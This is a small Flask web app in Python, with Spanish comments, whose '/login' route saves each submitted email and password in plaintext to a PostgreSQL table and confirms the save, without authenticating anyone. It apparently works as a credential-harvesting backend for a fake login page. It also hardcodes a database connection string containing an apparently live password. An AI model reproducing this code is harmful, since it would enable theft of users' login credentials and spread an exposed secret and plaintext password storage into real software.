import os
from flask import Flask, render_template, request
import psycopg2

app = Flask(__name__)

# Configuración de la base de datos PostgreSQL
DATABASE_URL = 'postgresql://mi_base_de_datos_n473_user:ZyY8w7FpPHDexkxPaVPe7Xfa3cM8GrSu@dpg-cu0u99rqf0us73d3ru2g-a/mi_base_de_datos_n473'  # URL de conexión a la base de datos
conn = psycopg2.connect(DATABASE_URL, sslmode='require')

# Ruta principal
@app.route('/')
def index():
    return render_template('index.html')

# Ruta para manejar el formulario de login
@app.route('/login', methods=['POST'])
def login():
    correo = request.form['correo']
    contraseña = request.form['contraseña']

    # Guardar los datos en la base de datos PostgreSQL
    cursor = conn.cursor()
    cursor.execute("INSERT INTO usuarios (correo, contraseña) VALUES (%s, %s)", (correo, contraseña))
    conn.commit()

    return "Datos guardados exitosamente"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
